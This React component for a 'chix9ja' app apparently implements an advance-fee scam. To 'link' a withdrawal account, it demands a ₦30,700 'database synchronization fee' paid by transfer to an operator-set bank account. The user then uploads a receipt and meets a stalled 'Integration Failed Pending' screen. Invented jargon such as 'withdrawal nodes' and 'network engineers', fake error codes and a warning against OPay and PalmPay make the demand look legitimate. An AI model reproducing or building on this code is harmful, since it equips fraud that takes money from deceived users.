
import React, { useState, useEffect } from 'react';
import { Icons } from './Icons';
import { User } from '../types';
import { syncUserFromLocalToFirestore, useBankDetails } from '../firebase';
import { motion, AnimatePresence } from 'motion/react';

const banksList = [
  "OPAY",
  "PALMPAY",
  "KUDA",
  "MONIEPOINT",
  "Access Bank",
  "GTBank",
  "Zenith Bank",
  "UBA",
  "First Bank",
  "Fidelity Bank",
  "Union Bank",
  "FCMB",
  "Sterling Bank"
];

const BANK_CODES_MAP: Record<string, string> = {
  "OPAY": "999992",
  "PALMPAY": "999991",
  "KUDA": "50211",
  "MONIEPOINT": "50515",
  "Access Bank": "044",
  "GTBank": "058",
  "Zenith Bank": "057",
  "UBA": "033",
  "First Bank": "011",
  "Fidelity Bank": "070",
  "Union Bank": "032",
  "FCMB": "214",
  "Sterling Bank": "050"
};

interface LinkWithdrawAccountProps {
  user: User;
  onBack: () => void;
}

const LinkWithdrawAccount: React.FC<LinkWithdrawAccountProps> = ({ user, onBack }) => {
  const { bankDetails } = useBankDetails();
  const [step, setStep] = useState<'form' | 'notice' | 'instructions' | 'upload' | 'status'>(() => {
    if (user.isAccountLinkedVerified) return 'status';
    if (user.pendingActivation === 'link_account') return 'status';
    return 'form';
  });
  const [accountName, setAccountName] = useState('');
  const [bankName, setBankName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [loading, setLoading] = useState(false);
  const [proofFile, setProofFile] = useState<File | null>(null);
  const [showOpayWarning, setShowOpayWarning] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  const [verificationStatus, setVerificationStatus] = useState<'idle' | 'verifying' | 'success' | 'failed'>('idle');
  const [verificationError, setVerificationError] = useState('');

  // Auto verify account number
  useEffect(() => {
    if (bankName && accountNumber.trim().length === 10) {
      const verifyAccount = async () => {
        setVerificationStatus('verifying');
        setVerificationError('');
        setAccountName('');
        
        const bankCode = BANK_CODES_MAP[bankName];
        if (!bankCode) {
          // If custom bank name, we can't do auto-verify
          setVerificationStatus('failed');
          setVerificationError('Press standard bank custom lookup to verify.');
          return;
        }

        try {
          const response = await fetch('/api/verify-account', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              accountNumber: accountNumber.trim(),
              bankCode,
            }),
          });

          const data = await response.json();
          if (!response.ok) {
            throw new Error(data.error || 'Unable to verify account details.');
          }

          setAccountName(data.accountName);
          setVerificationStatus('success');
        } catch (err: any) {
          console.error(err);
          setVerificationStatus('failed');
          setVerificationError(err.message || 'Auto-verification failed. Please enter name manually if needed.');
        }
      };

      verifyAccount();
    } else {
      setVerificationStatus('idle');
      if (accountNumber.trim().length !== 10) {
        setAccountName('');
      }
    }
  }, [bankName, accountNumber]);
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!accountName || !bankName || !accountNumber) {
      alert('Please fill in all fields');
      return;
    }
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep('notice');
    }, 1200);
  };

  const handleUploadProof = async () => {
    const existingUsersStr = localStorage.getItem('chix9ja_users');
    const existingUsers = existingUsersStr ? JSON.parse(existingUsersStr) : {};
    const currentUser: User = existingUsers[user.email.toLowerCase()];

    if (currentUser && currentUser.pendingPaymentProof) {
      alert("You already have a pending payment proof awaiting administrator verification. You cannot upload another receipt until it is approved or declined.");
      return;
    }

    const oneHour = 60 * 60 * 1000;
    if (currentUser && currentUser.lastUploadTimestamp && (Date.now() - currentUser.lastUploadTimestamp < oneHour)) {
      const remainingMinutes = Math.ceil((oneHour - (Date.now() - currentUser.lastUploadTimestamp)) / (60 * 1000));
      alert(`You can only upload a receipt once every hour. Please wait ${remainingMinutes} minutes before attempting another upload.`);
      return;
    }

    if (!proofFile) {
      alert('Please select a payment receipt photo');
      return;
    }
    setLoading(true);

    try {
      const base64Data = await new Promise<string>((resolve, reject) => {
        const reader = new FileReader();
        reader.readAsDataURL(proofFile);
        reader.onload = () => resolve(reader.result as string);
        reader.onerror = (e) => reject(e);
      });

      setTimeout(() => {
        const freshUsersStr = localStorage.getItem('chix9ja_users');
        const freshUsers = freshUsersStr ? JSON.parse(freshUsersStr) : {};
        const freshUser: User = freshUsers[user.email.toLowerCase()];

        if (freshUser) {
          freshUser.pendingActivation = 'link_account';
          freshUser.pendingPaymentProof = base64Data;
          freshUser.pendingPaymentAmount = 30700;
          freshUser.pendingPaymentDate = new Date().toISOString();
          freshUser.lastUploadTimestamp = Date.now();

          freshUsers[user.email.toLowerCase()] = freshUser;
          localStorage.setItem('chix9ja_users', JSON.stringify(freshUsers));

          syncUserFromLocalToFirestore(user.email).then(() => {
            setLoading(false);
            setShowSuccessModal(true);
          }).catch((e) => {
            console.error("Firestore sync error:", e);
            setLoading(false);
            setShowSuccessModal(true);
          });
        } else {
          setLoading(false);
          setStep('status');
        }
      }, 2000);
    } catch (e) {
      console.error("Error converting receipt file:", e);
      setLoading(false);
      alert("Error reading payment proof. Please try uploading again.");
    }
  };

  if (step === 'status') {
    if (user.isAccountLinkedVerified) {
      return (
        <div className="px-4 py-8 space-y-8 animate-in fade-in zoom-in duration-500 pb-24 text-center">
          <div className="flex justify-center">
            <div className="w-24 h-24 bg-green-500/10 rounded-full flex items-center justify-center border-2 border-green-500/50">
              <Icons.CheckCircle size={48} className="text-green-500 animate-pulse" />
            </div>
          </div>

          <div className="space-y-4">
            <h2 className="text-3xl font-black text-white uppercase tracking-tighter leading-tight">
              Congratulations!
            </h2>
            <div className="bg-green-500/10 border border-green-500/20 p-4 rounded-2xl space-y-2">
              <p className="text-green-400 text-xs font-bold uppercase tracking-widest">Withdraw Account Activated</p>
              <p className="text-sm font-bold text-white leading-relaxed">
                Your withdraw account integration is successful and validated. Kindly message support for more information.
              </p>
            </div>
            <p className="text-gray-400 text-sm leading-relaxed px-4">
              Your withdraw account integration is fully active and validated by our network engineers.
            </p>
          </div>

          <div className="pt-6">
            <button 
              onClick={onBack}
              className="w-full py-5 bg-green-glow text-black font-black rounded-2xl active:scale-[0.98] transition-all uppercase tracking-widest text-sm shadow-lg shadow-green-500/20"
            >
              Return to Dashboard
            </button>
          </div>
        </div>
      );
    }

    return (
      <div className="px-4 py-8 space-y-8 animate-in fade-in zoom-in duration-500 pb-24 text-center">
        <div className="flex justify-center">
          <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center border-2 border-red-500/50 animate-pulse">
            <Icons.Clock size={48} className="text-red-500" />
          </div>
        </div>

        <div className="space-y-4">
          <h2 className="text-3xl font-black text-white uppercase tracking-tighter leading-tight">
            Integration <span className="text-red-500">Failed Pending</span>
          </h2>
          <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-2xl">
            <p className="text-red-400 text-xs font-bold uppercase tracking-widest">Awaiting Manual Verification</p>
          </div>
          <p className="text-gray-400 text-sm leading-relaxed px-4">
            Your payment proof has been received but the database synchronization status is currently <span className="text-white font-bold">FAILED PENDING</span>. 
          </p>
          <p className="text-xs text-gray-500 italic">
            Please wait 4-12 hours for our network engineers to manually validate your transfer and activate your withdrawal node.
          </p>
        </div>

        <div className="pt-6">
          <button 
            onClick={onBack}
            className="w-full py-5 bg-gray-900 border border-white/10 text-white font-black rounded-2xl active:scale-[0.98] transition-all uppercase tracking-widest text-sm"
          >
            Return to Dashboard
          </button>
        </div>

        <div className="flex items-center justify-center space-x-2 text-[10px] text-gray-600 font-bold uppercase">
          <Icons.ShieldCheck size={14} className="text-red-500" />
          <span>Error Code: SYNC_PEND_403</span>
        </div>
      </div>
    );
  }

  if (step === 'upload') {
    return (
      <div className="px-4 py-8 space-y-8 animate-in fade-in slide-in-from-right-4 duration-500 pb-24">
        <div className="space-y-2 text-center">
          <h2 className="text-2xl font-black text-white uppercase tracking-tight">Upload Proof</h2>
          <p className="text-sm text-gray-400">Please upload a clear screenshot of your bank transfer</p>
        </div>

        <div className="bg-gray-900/50 border-2 border-dashed border-blue-500/30 rounded-[2.5rem] p-10 text-center space-y-4">
           {proofFile ? (
             <div className="space-y-4">
                <div className="mx-auto w-20 h-20 bg-green-500/10 rounded-2xl flex items-center justify-center text-green-500">
                  <Icons.CheckCircle size={40} />
                </div>
                <p className="text-white font-bold text-sm truncate px-4">{proofFile.name}</p>
                <button 
                  onClick={() => setProofFile(null)}
                  className="text-xs text-red-400 font-bold uppercase tracking-widest"
                >
                  Remove & Retry
                </button>
             </div>
           ) : (
             <label className="cursor-pointer block space-y-4">
                <input 
                  type="file" 
                  accept="image/*" 
                  className="sr-only" 
                  onChange={(e) => e.target.files && setProofFile(e.target.files[0])}
                />
                <div className="mx-auto w-20 h-20 bg-blue-600/10 rounded-2xl flex items-center justify-center text-blue-400">
                   <Icons.Upload size={32} />
                </div>
                <div>
                  <p className="text-white font-bold">Tap to Upload Receipt</p>
                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mt-1">PNG, JPG or JPEG</p>
                </div>
             </label>
           )}
        </div>

        <div className="space-y-4 pt-4">
          <button 
            disabled={!proofFile || loading}
            onClick={handleUploadProof}
            className={`w-full py-5 rounded-2xl font-black transition-all uppercase tracking-widest text-sm flex items-center justify-center space-x-2 ${proofFile && !loading ? 'bg-blue-600 text-white shadow-xl shadow-blue-600/20 active:scale-[0.98]' : 'bg-gray-800 text-gray-500 cursor-not-allowed'}`}
          >
            {loading ? (
              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
            ) : (
              <>
                <Icons.CheckCircle size={18} />
                <span>Submit Proof</span>
              </>
            )}
          </button>
          
          <button 
            onClick={() => setStep('instructions')}
            className="w-full py-4 text-gray-500 font-bold uppercase tracking-widest text-xs"
          >
            Go Back
          </button>
        </div>
      </div>
    );
  }

  if (step === 'instructions') {
    return (
      <div className="px-4 py-8 space-y-8 animate-in fade-in slide-in-from-right-4 duration-500 pb-24">
        <div className="space-y-2 text-center">
          <h2 className="text-2xl font-black text-white uppercase tracking-tight">Payment Details</h2>
          <p className="text-sm text-gray-400">Transfer exactly <span className="text-white font-bold text-lg">₦30,700</span> to the details below</p>
        </div>

        <div className="bg-red-600 text-white p-3 rounded-xl text-center font-black text-[10px] uppercase tracking-tighter shadow-lg animate-pulse">
           DONT USE OPAY AND PALMPAY FOR THIS PAYMENT. OTHER BANKS LIKE MONIEPOINT E.T.C ARE ALLOWED.
        </div>

        <div className="bg-gradient-to-br from-gray-900 to-black border border-white/5 rounded-[2.5rem] p-8 space-y-6 shadow-2xl">
           <div className="space-y-1">
              <p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em]">Management Bank</p>
              <p className="text-xl font-bold text-white tracking-tight">{bankDetails.bankName}</p>
           </div>
           
           <div className="space-y-1">
              <p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em]">Account Number</p>
              <div className="flex items-center justify-between">
                <p className="text-3xl font-black text-blue-400 tracking-wider">{bankDetails.accountNumber}</p>
                <button 
                  onClick={() => {navigator.clipboard.writeText(bankDetails.accountNumber); setShowOpayWarning(true);}}
                  className="p-2 bg-blue-600/10 text-blue-400 rounded-lg active:scale-90 transition-all"
                >
                  <Icons.Copy size={16} />
                </button>
              </div>
           </div>

           <div className="space-y-1">
              <p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em]">Account Name</p>
              <p className="text-lg font-bold text-white uppercase">{bankDetails.accountName}</p>
           </div>
        </div>

        <div className="bg-amber-400/5 border border-amber-400/10 p-4 rounded-2xl flex items-start space-x-3">
           <Icons.AlertTriangle size={20} className="text-amber-400 shrink-0 mt-0.5" />
           <p className="text-[10px] text-gray-400 leading-relaxed italic">
             Important: After transfer, you MUST upload your payment receipt. Failure to upload proof will result in synchronization timeouts.
           </p>
        </div>

        <div className="space-y-4 pt-4">
          <button 
            onClick={() => setStep('upload')}
            className="w-full py-5 bg-blue-600 text-white font-black rounded-2xl shadow-xl shadow-blue-600/20 active:scale-[0.98] transition-all uppercase tracking-widest text-sm flex items-center justify-center space-x-2"
          >
            <span>I Have Made Payment</span>
            <Icons.ArrowRight size={18} />
          </button>
          
          <button 
            onClick={() => setStep('notice')}
            className="w-full py-4 text-gray-500 font-bold uppercase tracking-widest text-xs"
          >
            Go Back
          </button>
        </div>
      </div>
    );
  }

  if (step === 'notice') {
    return (
      <div className="px-4 py-8 space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-24 text-center">
        <div className="flex justify-center">
          <div className="w-24 h-24 bg-amber-400/10 rounded-full flex items-center justify-center animate-pulse border-2 border-amber-400/50">
            <Icons.AlertTriangle size={48} className="text-amber-400" />
          </div>
        </div>

        <div className="space-y-4">
          <h2 className="text-3xl font-black text-white uppercase tracking-tighter leading-tight">
            Account Linking <span className="text-amber-400">Incomplete</span>
          </h2>
          <p className="text-gray-400 text-sm leading-relaxed px-4">
            Standard verification required. To complete the secure linking of your withdrawal account to the <span className="text-white font-bold italic">chix9ja</span> network, a one-time database synchronization fee is required.
          </p>
        </div>

        <div className="bg-gray-900 border-2 border-amber-400/20 rounded-[2.5rem] p-8 space-y-4 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 right-0 p-4 opacity-10">
            <Icons.Lock size={120} />
          </div>
          <p className="text-[10px] font-black text-amber-400 uppercase tracking-[0.2em]">Required Payment</p>
          <p className="text-5xl font-black text-white tracking-tighter">₦30,700</p>
          <div className="h-px bg-gray-800 w-1/2 mx-auto"></div>
          <p className="text-xs text-gray-500 font-bold uppercase tracking-widest">Database Sync Fee</p>
        </div>

        <div className="space-y-4">
          <button 
            className="w-full py-5 bg-amber-400 text-black font-black rounded-2xl shadow-xl shadow-amber-400/20 active:scale-[0.98] transition-all uppercase tracking-widest text-sm"
            onClick={() => setStep('instructions')}
          >
            PROCEED TO PAYMENT
          </button>
          
          <button 
            onClick={onBack}
            className="w-full py-4 text-gray-500 font-bold uppercase tracking-widest text-xs hover:text-white transition-colors"
          >
            Cancel & Return
          </button>
        </div>

        <div className="flex items-center justify-center space-x-2 text-[10px] text-gray-600 font-bold uppercase">
          <Icons.ShieldCheck size={14} className="text-amber-400" />
          <span>Secured by chix9ja Node Validator v4.2</span>
        </div>
      </div>
    );
  }

  return (
    <div className="px-4 py-6 space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-24">
      <div className="flex items-center space-x-2">
        <button onClick={onBack} className="p-2 rounded-full hover:bg-gray-800 transition-colors">
          <Icons.ArrowLeft size={24} className="text-white" />
        </button>
        <h2 className="text-xl font-bold text-white">Link Account</h2>
      </div>

      <div className="text-center space-y-2">
        <div className="mx-auto w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center text-blue-400 mb-4 border border-blue-600/20">
          <Icons.Link size={32} />
        </div>
        <h3 className="text-2xl font-black text-white uppercase tracking-tight">Withdrawal Account</h3>
        <p className="text-sm text-gray-500 font-medium">Provide details for your external bank account</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6 bg-gray-900/50 p-6 rounded-[2rem] border border-white/5 backdrop-blur-xl">
        <div className="space-y-4">
          <div className="space-y-1.5">
            <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Bank Name</label>
            <div className="relative animate-in fade-in duration-300">
              <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <Icons.Banknote size={18} className="text-blue-500/50" />
              </div>
              <select
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                className="w-full bg-black border border-gray-800 p-4 pl-12 pr-10 rounded-2xl text-white outline-none focus:border-blue-500 transition-all font-medium text-sm appearance-none cursor-pointer"
              >
                <option value="" disabled className="text-gray-500">Select Bank</option>
                {banksList.map((b) => (
                  <option key={b} value={b} className="bg-black text-white">{b}</option>
                ))}
              </select>
              <div className="absolute inset-y-0 right-0 pr-4 flex items-center pointer-events-none text-gray-500">
                <Icons.ArrowRight size={16} className="rotate-90 text-blue-500/50" />
              </div>
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Account Number</label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <Icons.Hash size={18} className="text-blue-500/50" />
              </div>
              <input 
                type="number"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                placeholder="10-digit Account Number"
                className="w-full bg-black border border-gray-800 p-4 pl-12 rounded-2xl text-white outline-none focus:border-blue-500 transition-all font-medium text-sm tracking-widest"
              />
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Account Name</label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <Icons.User size={18} className="text-blue-500/50" />
              </div>
              <input 
                type="text"
                value={accountName}
                onChange={(e) => setAccountName(e.target.value)}
                placeholder="Will auto-resolve after putting bank & account number"
                className="w-full bg-black border border-gray-800 p-4 pl-12 rounded-2xl text-white outline-none focus:border-blue-500 transition-all font-medium text-sm disabled:opacity-80 disabled:cursor-not-allowed"
                disabled={verificationStatus === 'verifying'}
              />
            </div>
            {/* Inline verification statuses */}
            {verificationStatus === 'verifying' && (
              <div className="text-xs text-amber-500 flex items-center space-x-1.5 mt-1 ml-1 animate-pulse">
                <div className="w-3.5 h-3.5 border border-amber-500 border-t-transparent rounded-full animate-spin" />
                <span>Resolving account details via secure core network...</span>
              </div>
            )}
            {verificationStatus === 'success' && (
              <div className="text-xs text-green-500 flex items-center space-x-1.5 mt-1 ml-1 font-bold">
                <Icons.CheckCircle size={14} className="text-green-500" />
                <span>Verified: <strong className="text-white tracking-wide">{accountName}</strong></span>
              </div>
            )}
            {verificationStatus === 'failed' && (
              <div className="text-xs text-gray-500 flex items-center space-x-1.5 mt-1 ml-1 italic font-medium">
                <Icons.Info size={14} />
                <span>Manual input fallback: {verificationError || 'Could not verify account name.'}</span>
              </div>
            )}
          </div>
        </div>

        <button 
          type="submit"
          disabled={loading}
          className="w-full py-5 bg-blue-600 text-white font-black rounded-2xl shadow-xl shadow-blue-600/10 active:scale-[0.98] transition-all flex items-center justify-center space-x-2 uppercase tracking-widest text-sm"
        >
          {loading ? (
            <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
          ) : (
            <>
              <Icons.PlusCircle size={18} />
              <span>Link Account Now</span>
            </>
          )}
        </button>
      </form>

      <div className="bg-blue-600/5 p-4 rounded-xl border border-blue-600/10">
         <p className="text-[10px] text-blue-400 font-bold uppercase tracking-widest mb-1">Security Notice</p>
         <p className="text-xs text-gray-500 leading-relaxed italic">
           Ensure your details are accurate. Linked accounts are cryptographically bound to your chix9ja profile for zero-risk settlements.
         </p>
      </div>

      {/* Beautiful OPay & PalmPay warning modal overlay */}
      <AnimatePresence>
        {showOpayWarning && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={() => setShowOpayWarning(false)}
            className="fixed inset-0 z-[300] flex items-center justify-center p-4 bg-black/90 backdrop-blur-md"
          >
            <motion.div
              initial={{ scale: 0.92, y: 15 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.92, y: 15 }}
              onClick={(e) => e.stopPropagation()}
              className="w-full max-w-sm rounded-[24px] p-6 border border-emerald-500/20 text-center space-y-5 bg-gradient-to-b from-gray-950 via-zinc-950 to-black shadow-[0_0_50px_rgba(239,68,68,0.25)] relative overflow-hidden"
            >
              {/* Top Accent Bar */}
              <div className="absolute top-0 inset-x-0 h-1.5 bg-gradient-to-r from-red-550 via-amber-500 to-red-500" />
              
              {/* Outer Glowing Circle around Warning Icon */}
              <div className="mx-auto w-16 h-16 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-500 animate-bounce">
                <Icons.AlertTriangle size={36} className="text-red-500 text-glow-red" />
              </div>

              {/* Header Titles */}
              <div className="space-y-1">
                <div className="inline-flex items-center space-x-1 px-2.5 py-1 bg-red-500/10 rounded-full border border-red-500/10">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-ping" />
                  <span className="text-[9px] font-black uppercase text-red-500 tracking-widest font-mono">CRITICAL WARNING</span>
                </div>
                <h3 className="text-sm font-black text-white uppercase tracking-tight">Do Not Use OPay or PalmPay</h3>
              </div>

              {/* Informative Text block */}
              <p className="text-[11px] text-gray-400 font-sans leading-relaxed">
                Payments made through <strong className="text-red-405">OPay</strong> or <strong className="text-red-405">PalmPay</strong> accounts are <strong className="text-white">NOT supported</strong> by our automatic bank synchronization nodes. Transferring via these platforms can cause automatic activation timeouts or lost funds.
              </p>

              {/* Allowed Alternatives Box */}
              <div className="bg-emerald-950/20 border border-emerald-500/25 rounded-xl p-3 space-y-2 text-left">
                <p className="text-[8px] font-black uppercase text-emerald-400 tracking-wider font-mono font-bold">SUPPORTED PAYMENT CHANNELS</p>
                <div className="flex flex-wrap gap-1.5">
                  {['GTBank', 'Zenith Bank', 'Access Bank', 'Moniepoint', 'UBA', 'Kuda', 'Wema'].map(bName => (
                    <span key={bName} className="px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/15 text-emerald-300 font-mono text-[8.5px] font-bold">
                      ✓ {bName}
                    </span>
                  ))}
                </div>
              </div>

              {/* Action Button */}
              <button
                type="button"
                onClick={() => setShowOpayWarning(false)}
                className="w-full py-3 bg-red-500 hover:bg-red-605 text-white font-black text-[10px] uppercase tracking-widest rounded-xl transition-all shadow-[0_4px_16px_rgba(239,68,68,0.2)] active:scale-95"
              >
                I Understand, Proceed
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Beautiful payment success check-in popup */}
      <AnimatePresence>
        {showSuccessModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[400] flex items-center justify-center p-4 bg-black/95 backdrop-blur-md"
          >
            <motion.div
              initial={{ scale: 0.95, y: 15 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.95, y: 15 }}
              className="w-full max-w-sm rounded-[24px] p-6 border border-green-500/20 text-center space-y-5 bg-gradient-to-b from-gray-950 via-zinc-950 to-black shadow-[0_0_50px_rgba(34,197,94,0.25)] relative overflow-hidden"
            >
              {/* Top Custom Border bar */}
              <div className="absolute top-0 inset-x-0 h-1.5 bg-gradient-to-r from-emerald-500 via-green-glow to-teal-500" />
              
              <div className="mx-auto w-16 h-16 rounded-full bg-green-500/10 border border-green-500/30 flex items-center justify-center text-green-500 animate-pulse">
                <Icons.CheckCircle size={36} className="text-green-400 text-glow-green" />
              </div>

              <div className="space-y-2">
                <div className="inline-flex items-center space-x-1 px-2.5 py-1 bg-green-500/10 rounded-full border border-green-500/10">
                  <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-ping" />
                  <span className="text-[9px] font-black uppercase text-green-400 tracking-widest font-mono">SUBMITTED SUCCESSFULLY</span>
                </div>
                <h3 className="text-base font-black text-white uppercase tracking-tight">Payment Upload Received</h3>
              </div>

              <div className="text-xs text-gray-300 leading-relaxed font-sans space-y-3 px-1">
                <p>
                  Your activation files have been successfully uploaded to the central chix9ja database nodes for instant review.
                </p>
                <div className="p-3 bg-zinc-900/80 rounded-xl border border-zinc-800 text-[11px] text-green-glow font-bold leading-relaxed">
                  📧 You will receive an email within <span className="font-extrabold text-white">5 minutes</span> notifying you if your activation has been approved!
                </div>
              </div>

              <button
                type="button"
                onClick={() => {
                  setShowSuccessModal(false);
                  setStep('status');
                }}
                className="w-full py-3.5 bg-green-glow text-black font-extrabold text-[11px] uppercase tracking-widest rounded-xl transition-all shadow-[0_4px_16px_rgba(34,197,94,0.2)] active:scale-95 hover:bg-emerald-400"
              >
                Return to Status
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default LinkWithdrawAccount;
